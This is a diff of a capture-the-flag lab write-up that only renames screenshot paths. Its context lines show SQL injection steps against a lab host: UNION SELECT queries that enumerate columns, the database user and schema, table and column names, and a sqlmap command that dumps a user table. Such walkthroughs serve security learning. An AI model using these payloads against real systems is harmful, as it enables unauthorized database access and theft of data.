@@ -13,19 +13,19 @@ After Navigating round the entire page, there is a `/products` page that is vuln
 
 If you navigate to a page that dosen't exist, it displays an error.&#x20;
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 ### Number of Columns
 
 `http://10.10.157.23/products/5 UNION SELECT 1,2,3,4,5,6,7,8-- -` - there are 8 columns, if you enter `9` you get an error, and again we see that both columns 8 and 2 are visible so we can output our queries from either of them.
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Current User of the DB
 
 `http://10.10.157.23/products/5%20UNION%20SELECT%201,current_user(),3,4,5,6,7,8`
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Its the root user.
 
@@ -33,13 +33,13 @@ Its the root user.
 
 `http://10.10.157.23/products/5%20UNION%20SELECT%201,database(),3,4,5,6,7,8`&#x20;
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Or we can do the below to dump all schemas/dbs**
 
 `http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(schema_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.SCHEMATA` - or we can use the "JSON\_ARRAYAGG" with the "CONCAT" function to view all DB/Schema names.
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Table Name
 
@@ -51,13 +51,13 @@ Table name is --> product
 
 `http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(table_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema="duckyinc"`&#x20;
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Columns in Table
 
 `http://10.10.157.23/products/5 UNION SELECT 13,CONCAT(JSON_ARRAYAGG(column_name)),13,13,13,13,13,13 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="product"`&#x20;
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now:
 
@@ -140,7 +140,7 @@ sqlmap 10.10.157.23/products/1 --batch -D duckyinc -T user --dump
 ```
 {% endcode %}
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>The flag is also here.</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption><p>The flag is also here.</p></figcaption></figure>
 
 ### Initial Access
 
